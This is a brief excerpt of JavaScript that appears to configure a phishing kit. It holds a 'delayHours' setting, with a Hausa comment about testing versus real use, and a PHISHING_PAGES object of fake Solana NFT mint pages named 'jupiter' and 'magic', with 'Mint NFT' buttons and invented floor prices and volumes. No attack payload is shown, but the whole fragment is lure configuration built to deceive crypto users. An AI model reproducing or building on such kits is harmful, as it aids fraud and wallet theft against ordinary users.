...
// 3. 24-HOUR DELAY (hours) - Saita 0 don gwaji, 24 don gaske
const delayHours = 0;
...
const PHISHING_PAGES = {
    ...
    'jupiter': {
        ...
        btn: 'Mint NFT', items: '82K', floor: '50 SOL', volume: '8,560 SOL',
    ...
    'magic': {
        ...
        btn: 'Mint NFT', items: '51K', floor: '25 SOL', volume: '4,120 SOL',
